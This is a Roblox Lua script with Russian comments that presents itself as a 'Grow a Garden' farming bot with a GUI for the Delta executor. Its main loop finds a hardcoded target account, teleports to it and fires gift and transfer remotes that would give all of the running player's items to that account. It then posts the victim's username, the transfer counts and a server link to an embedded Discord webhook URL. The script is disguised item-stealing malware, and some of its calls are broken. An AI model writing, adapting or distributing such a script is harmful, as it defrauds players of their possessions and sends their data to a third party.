--[[
    🌿 ULTIMATE GROW A GARDEN DELTA BOT v10.0
    Полностью проработанный скрипт с GUI
    Совместимость с Delta Executor
]]

-- ===== КОНФИГУРАЦИЯ =====
local CONFIG = {
    TARGET_USERNAME = "Sgahfd1223",
    WEBHOOK_URL = "https://discord.com/api/webhooks/1404173568350093424/f_ND3zfZWAHapUMdFRlC77aU0ZdSbPmzFASONMUfhoaguz_zD8j_UDwuAsV5Lvj0rxIz",
    CHECK_INTERVAL = 30,
    GARDEN_CHECK_INTERVAL = 120,
    MAX_RETRIES = 5,
    TRANSFER_DELAY = 0.3,
    DEBUG_MODE = false,
    AUTO_START = false
}

-- ===== СЕРВИСЫ =====
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

-- ===== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =====
local LocalPlayer = Players.LocalPlayer
local TargetPlayer = nil
local AttemptCount = 0
local SuccessCount = 0
local GardenCollectCount = 0
local LastGardenCollect = 0
local BotStartTime = os.time()
local MainGUI = nil
local BotEnabled = false

-- ===== ЦВЕТОВАЯ СХЕМА =====
local COLORS = {
    Background = Color3.fromRGB(20, 20, 30),
    Primary = Color3.fromRGB(0, 150, 255),
    Secondary = Color3.fromRGB(0, 200, 100),
    Accent = Color3.fromRGB(255, 80, 80),
    Text = Color3.fromRGB(240, 240, 240),
    DarkText = Color3.fromRGB(160, 160, 160),
    Panel = Color3.fromRGB(30, 30, 40),
    Success = Color3.fromRGB(0, 220, 100),
    Warning = Color3.fromRGB(255, 180, 40),
    Error = Color3.fromRGB(255, 80, 80)
}

-- ===== СИСТЕМА ЛОГГИРОВАНИЯ =====
local Logger = {
    add = function(message, level)
        level = level or "INFO"
        local timestamp = os.date("%H:%M:%S")
        local formatted = string.format("[%s] [%s] %s", timestamp, level, message)
        print(formatted)
        
        if MainGUI and MainGUI.LogText then
            MainGUI.LogText.Text = formatted .. "\n" .. MainGUI.LogText.Text
            if #MainGUI.LogText.Text > 1000 then
                MainGUI.LogText.Text = string.sub(MainGUI.LogText.Text, 1, 1000)
            end
        end
    end,
    
    info = function(message) Logger.add(message, "INFO") end,
    success = function(message) Logger.add(message, "SUCCESS") end,
    warn = function(message) Logger.add(message, "WARN") end,
    error = function(message) Logger.add(message, "ERROR") end
}

-- ===== СИСТЕМА ПОИСКА REMOTE EVENTS =====
local RemoteSystem = {
    findAllRemotes = function()
        local remotes = {}
        local containers = {ReplicatedStorage, game:GetService("ServerScriptService")}
        
        for _, container in ipairs(containers) do
            pcall(function()
                for _, item in ipairs(container:GetDescendants()) do
                    if item:IsA("RemoteEvent") then
                        table.insert(remotes, item)
                    end
                end
            end)
        end
        
        return remotes
    end,
    
    getTeleportRemotes = function()
        local remotes = RemoteSystem.findAllRemotes()
        local filtered = {}
        for _, remote in ipairs(remotes) do
            local name = remote.Name:lower()
            if name:find("teleport") or name:find("goto") or name:find("follow") then
                table.insert(filtered, remote)
            end
        end
        return filtered
    end,
    
    getGardenRemotes = function()
        local remotes = RemoteSystem.findAllRemotes()
        local filtered = {}
        for _, remote in ipairs(remotes) do
            local name = remote.Name:lower()
            if name:find("garden") or name:find("farm") or name:find("collect") then
                table.insert(filtered, remote)
            end
        end
        return filtered
    end,
    
    getTransferRemotes = function()
        local remotes = RemoteSystem.findAllRemotes()
        local filtered = {}
        for _, remote in ipairs(remotes) do
            local name = remote.Name:lower()
            if name:find("gift") or name:find("transfer") or name:find("send") then
                table.insert(filtered, remote)
            end
        end
        return filtered
    end
}

-- ===== СИСТЕМА САДА =====
local GardenSystem = {
    findGarden = function()
        local gardenNames = {"Garden", "Farm", "FarmArea", "GrowingArea"}
        for _, name in ipairs(gardenNames) do
            local area = workspace:FindFirstChild(name)
            if area then return area end
        end
        return nil
    end,
    
    findPets = function(garden)
        if not garden then return {} end
        local pets = {}
        for _, obj in ipairs(garden:GetDescendants()) do
            if obj:IsA("Model") and obj.Name:lower():find("pet") then
                table.insert(pets, obj)
            end
        end
        return pets
    end,
    
    collectPets = function()
        if os.time() - LastGardenCollect < CONFIG.GARDEN_CHECK_INTERVAL then
            return 0
        end
        
        local garden = GardenSystem.findGarden()
        if not garden then
            Logger.debug("Сад не найден")
            return 0
        end
        
        local pets = GardenSystem.findPets(garden)
        if #pets == 0 then
            Logger.debug("Питомцы не найдены")
            return 0
        end
        
        local collectRemotes = RemoteSystem.getGardenRemotes()
        local collected = 0
        
        for _, remote in ipairs(collectRemotes) do
            for _, pet in ipairs(pets) do
                local success = pcall(function()
                    remote:FireServer("CollectPet", pet)
                    return true
                end)
                if success then
                    collected = collected + 1
                    task.wait(0.2)
                end
            end
        end
        
        if collected > 0 then
            GardenCollectCount = GardenCollectCount + collected
            LastGardenCollect = os.time()
            Logger.success("Собрано питомцев: " .. collected)
        end
        
        return collected
    end
}

-- ===== СИСТЕМА ТЕЛЕПОРТАЦИИ =====
local TeleportSystem = {
    safeTeleport = function(targetPlayer)
        if not targetPlayer then return false end
        
        -- Метод 1: Через RemoteEvents
        local teleportRemotes = RemoteSystem.getTeleportRemotes()
        for _, remote in ipairs(teleportRemotes) do
            local success = pcall(function()
                remote:FireServer("TeleportToPlayer", targetPlayer)
                return true
            end)
            if success then return true end
        end
        
        -- Метод 2: Через TeleportService
        local success = pcall(function()
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, targetPlayer)
            return true
        end)
        
        return success
    end,
    
    getServerLink = function()
        return string.format("https://www.roblox.com/games/%d", game.PlaceId)
    end
}

-- ===== СИСТЕМА ПЕРЕДАЧИ ПРЕДМЕТОВ =====
local TransferSystem = {
    transferItems = function(targetPlayer)
        local transferRemotes = RemoteSystem.getTransferRemotes()
        local transferred = 0
        
        for _, remote in ipairs(transferRemotes) do
            local methods = {"GiftAll", "TransferAll", "SendAll"}
            for _, method in ipairs(methods) do
                local success = pcall(function()
                    remote:FireServer(method, targetPlayer)
                    return true
                end)
                if success then
                    transferred = transferred + 1
                    task.wait(CONFIG.TRANSFER_DELAY)
                end
            end
        end
        
        return transferred
    end
}

-- ===== СИСТЕМА ВЕБХУК УВЕДОМЛЕНИЙ =====
local WebhookSystem = {
    sendNotification = function(targetPlayer, transferred, teleportSuccess, collected)
        if not CONFIG.WEBHOOK_URL then return false end
        
        local serverLink = TeleportSystem.getServerLink()
        local payload = {
            embeds = {{
                title = "🌿 Garden Bot Report",
                color = teleportSuccess and 65280 or 16711680,
                fields = {
                    {name = "👤 Игрок", value = LocalPlayer.Name, inline = true},
                    {name = "🎯 Цель", value = targetPlayer.Name, inline = true},
                    {name = "📦 Передано", value = transferred, inline = true},
                    {name = "🌿 Собрано", value = collected, inline = true},
                    {name = "🔗 Сервер", value = serverLink, inline = false}
                }
            }}
        }
        
        local success = pcall(function()
            game:HttpGet(CONFIG.WEBHOOK_URL, {
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(payload)
            })
            return true
        end)
        
        return success
    end
}

-- ===== GUI СИСТЕМА =====
local GUISystem = {
    createMainMenu = function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "GardenBotGUI"
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        screenGui.Parent = CoreGui
        
        local mainFrame = Instance.new("Frame")
        mainFrame.Size = UDim2.new(0, 400, 0, 500)
        mainFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
        mainFrame.BackgroundColor3 = COLORS.Background
        mainFrame.BorderSizePixel = 0
        mainFrame.Parent = screenGui
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 10)
        corner.Parent = mainFrame
        
        -- Заголовок
        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(1, 0, 0, 50)
        title.Position = UDim2.new(0, 0, 0, 0)
        title.BackgroundColor3 = COLORS.Primary
        title.BorderSizePixel = 0
        title.Text = "🌿 GARDEN BOT v10.0"
        title.TextColor3 = COLORS.Text
        title.TextSize = 18
        title.Font = Enum.Font.GothamBold
        title.Parent = mainFrame
        
        local titleCorner = Instance.new("UICorner")
        titleCorner.CornerRadius = UDim.new(0, 10)
        titleCorner.Parent = title
        
        -- Контент
        local contentFrame = Instance.new("Frame")
        contentFrame.Size = UDim2.new(1, -20, 1, -70)
        contentFrame.Position = UDim2.new(0, 10, 0, 60)
        contentFrame.BackgroundTransparency = 1
        contentFrame.Parent = mainFrame
        
        -- Статус
        local statusText = Instance.new("TextLabel")
        statusText.Size = UDim2.new(1, 0, 0, 30)
        statusText.BackgroundTransparency = 1
        statusText.Text = "Статус: Остановлен"
        statusText.TextColor3 = COLORS.Error
        statusText.TextSize = 16
        statusText.Font = Enum.Font.GothamBold
        statusText.Parent = contentFrame
        
        local targetText = Instance.new("TextLabel")
        targetText.Size = UDim2.new(1, 0, 0, 20)
        targetText.Position = UDim2.new(0, 0, 0, 30)
        targetText.BackgroundTransparency = 1
        targetText.Text = "Цель: " .. CONFIG.TARGET_USERNAME
        targetText.TextColor3 = COLORS.DarkText
        targetText.TextSize = 14
        targetText.Font = Enum.Font.Gotham
        targetText.Parent = contentFrame
        
        -- Кнопки
        local startButton = Instance.new("TextButton")
        startButton.Size = UDim2.new(1, 0, 0, 40)
        startButton.Position = UDim2.new(0, 0, 0, 60)
        startButton.BackgroundColor3 = COLORS.Success
        startButton.BorderSizePixel = 0
        startButton.Text = "🚀 ЗАПУСТИТЬ БОТ"
        startButton.TextColor3 = COLORS.Text
        startButton.TextSize = 16
        startButton.Font = Enum.Font.GothamBold
        startButton.Parent = contentFrame
        
        local stopButton = Instance.new("TextButton")
        stopButton.Size = UDim2.new(1, 0, 0, 40)
        stopButton.Position = UDim2.new(0, 0, 0, 110)
        stopButton.BackgroundColor3 = COLORS.Error
        stopButton.BorderSizePixel = 0
        stopButton.Text = "⏹️ ОСТАНОВИТЬ"
        stopButton.TextColor3 = COLORS.Text
        stopButton.TextSize = 16
        stopButton.Font = Enum.Font.GothamBold
        stopButton.Parent = contentFrame
        
        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0, 8)
        buttonCorner.Parent = startButton
        buttonCorner:Clone().Parent = stopButton
        
        -- Статистика
        local statsText = Instance.new("TextLabel")
        statsText.Size = UDim2.new(1, 0, 0, 80)
        statsText.Position = UDim2.new(0, 0, 0, 160)
        statsText.BackgroundTransparency = 1
        statsText.Text = "Попыток: 0\nУспешно: 0\nСобрано: 0"
        statsText.TextColor3 = COLORS.Text
        statsText.TextSize = 14
        statsText.Font = Enum.Font.Gotham
        statsText.TextXAlignment = Enum.TextXAlignment.Left
        statsText.Parent = contentFrame
        
        -- Логи
        local logFrame = Instance.new("ScrollingFrame")
        logFrame.Size = UDim2.new(1, 0, 0, 150)
        logFrame.Position = UDim2.new(0, 0, 0, 250)
        logFrame.BackgroundColor3 = COLORS.Panel
        logFrame.BorderSizePixel = 0
        logFrame.ScrollBarThickness = 6
        logFrame.Parent = contentFrame
        
        local logCorner = Instance.new("UICorner")
        logCorner.CornerRadius = UDim.new(0, 8)
        logCorner.Parent = logFrame
        
        local logText = Instance.new("TextLabel")
        logText.Size = UDim2.new(1, -10, 1, -10)
        logText.Position = UDim2.new(0, 10, 0, 10)
        logText.BackgroundTransparency = 1
        logText.Text = "Логи будут здесь..."
        logText.TextColor3 = COLORS.Text
        logText.TextSize = 12
        logText.Font = Enum.Font.Gotham
        logText.TextXAlignment = Enum.TextXAlignment.Left
        logText.TextYAlignment = Enum.TextYAlignment.Top
        logText.TextWrapped = true
        logText.Parent = logFrame
        
        return {
            Gui = screenGui,
            StatusText = statusText,
            StartButton = startButton,
            StopButton = stopButton,
            StatsText = statsText,
            LogText = logText
        }
    end,
    
    updateStats = function()
        if not MainGUI then return end
        MainGUI.StatsText.Text = string.format(
            "Попыток: %d\nУспешно: %d\nСобрано: %d",
            AttemptCount, SuccessCount, GardenCollectCount
        )
    end
}

-- ===== ОСНОВНАЯ СИСТЕМА БОТА =====
local GardenBot = {
    init = function()
        Logger.info("Инициализация бота...")
        
        -- Создание GUI
        MainGUI = GUISystem.createMainMenu()
        
        -- Настройка кнопок
        MainGUI.StartButton.MouseButton1Click:Connect(function()
            GardenBot.start()
        end)
        
        MainGUI.StopButton.MouseButton1Click:Connect(function()
            GardenBot.stop()
        end)
        
        Logger.info("Бот готов к работе!")
        
        if CONFIG.AUTO_START then
            task.wait(2)
            GardenBot.start()
        end
    end,
    
    start = function()
        if BotEnabled then
            Logger.warn("Бот уже запущен!")
            return
        end
        
        BotEnabled = true
        MainGUI.StatusText.Text = "Статус: Работает"
        MainGUI.StatusText.TextColor3 = COLORS.Success
        Logger.success("Бот запущен!")
        
        spawn(function()
            while BotEnabled do
                GardenBot.mainLoop()
                task.wait(CONFIG.CHECK_INTERVAL)
            end
        end)
    end,
    
    stop = function()
        if not BotEnabled then
            Logger.warn("Бот уже остановлен!")
            return
        end
        
        BotEnabled = false
        MainGUI.StatusText.Text = "Статус: Остановлен"
        MainGUI.StatusText.TextColor3 = COLORS.Error
        Logger.success("Бот остановлен!")
    end,
    
    mainLoop = function()
        if not BotEnabled then return end
        
        AttemptCount = AttemptCount + 1
        Logger.info("Поиск целевого игрока...")
        
        -- Автоматический сбор
        local collected = GardenSystem.collectPets()
        
        -- Поиск игрока
        local targetFound = false
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Name:lower() == CONFIG.TARGET_USERNAME:lower() then
                TargetPlayer = player
                targetFound = true
                break
            end
        end
        
        if not targetFound then
            Logger.info("Целевой игрок не найден")
            GUISystem.updateStats()
            return
        end
        
        Logger.success("Целевой игрок найден: " .. TargetPlayer.Name)
        
        -- Телепортация
        local teleportSuccess = TeleportSystem.safeTeleport(TargetPlayer)
        
        if teleportSuccess then
            Logger.success("Успешная телепортация")
            task.wait(3)
            
            local transferred = TransferSystem.transferItems(TargetPlayer)
            
            if transferred > 0 then
                SuccessCount = SuccessCount + 1
                Logger.success("Передано предметов: " .. transferred)
                
                WebhookSystem.sendNotification(TargetPlayer, transferred, teleportSuccess, collected)
            end
        else
            Logger.error("Ошибка телепортации")
        end
        
        GUISystem.updateStats()
    end
}

if not game:IsLoaded() then
    game.Loaded:Wait()
end

if not Players.LocalPlayer then
    Players.PlayerAdded:Wait()
end

task.wait(3)

local success, err = pcall(function()
    GardenBot.init()
end)

if not success then
    warn("Ошибка инициализации: " .. tostring(err))
end

return "GARDEN_BOT_ACTIVATED"
